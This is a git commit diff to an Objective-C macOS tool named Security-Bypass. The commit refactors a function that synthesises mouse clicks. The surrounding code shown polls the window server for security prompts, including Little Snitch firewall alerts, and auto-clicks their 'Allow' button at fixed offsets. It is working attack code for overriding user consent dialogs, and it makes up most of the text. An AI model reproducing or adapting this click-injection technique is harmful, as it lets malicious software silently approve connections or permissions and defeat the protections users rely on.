903c15bbf7b4164ddcec37dd8dbee4423d0acb2d
Sabri <sabri@riseup.net>
2016-12-24 00:16:26 +0100

    Directly sending CGPointMake to the function

--- Security-Bypass/main.m
+++ Security-Bypass/main.m
@@ -17,9 +17,8 @@ void doEvent(CGPoint initialMousePosition, CGEventType event) {
     CFRelease(currentEvent);
 }
 
-void clickOnButton(int width, int height, CGPoint oldLocation) {
+void clickOnButton(CGPoint initialMousePosition, CGPoint oldLocation) {
     // Click at the desired position
-    CGPoint initialMousePosition = CGPointMake(width, height);
     NSLog(@"Doing some magic...!\n");
     [NSThread sleepForTimeInterval:0.001];
     doEvent(initialMousePosition, kCGEventLeftMouseDown);
@@ -33,6 +32,7 @@ int main(int argc, const char * argv[]) {
     
     // Don't really know if it's dirty or not, anyway we don't care
     while (1) {
+        
         NSLog(@"Watching for new windows...\n");
         
         // Ask the window server for the list of windows.
@@ -58,7 +58,7 @@ int main(int argc, const char * argv[]) {
                 NSArray *kCGWindowBounds = [element objectForKey:@"kCGWindowBounds"];
 
                 // Window is present, click on the button "Allow"
-                clickOnButton([[kCGWindowBounds valueForKey:@"X"] intValue] + 666, [[kCGWindowBounds valueForKey:@"Y"] intValue] + 280, oldLocation);
+                clickOnButton(CGPointMake([[kCGWindowBounds valueForKey:@"X"] intValue] + 666, [[kCGWindowBounds valueForKey:@"Y"] intValue] + 280), oldLocation);
             }
             
             // Little Snitch detection
@@ -66,7 +66,7 @@ int main(int argc, const char * argv[]) {
                 NSArray *kCGWindowBounds = [element objectForKey:@"kCGWindowBounds"];
                 
                 // Window is present, click on the button "Allow"
-                clickOnButton([[kCGWindowBounds valueForKey:@"X"] intValue] + 587, [[kCGWindowBounds valueForKey:@"Y"] intValue] + 340, oldLocation);
+                clickOnButton(CGPointMake([[kCGWindowBounds valueForKey:@"X"] intValue] + 587, [[kCGWindowBounds valueForKey:@"Y"] intValue] + 340), oldLocation);
             }
         }
     }
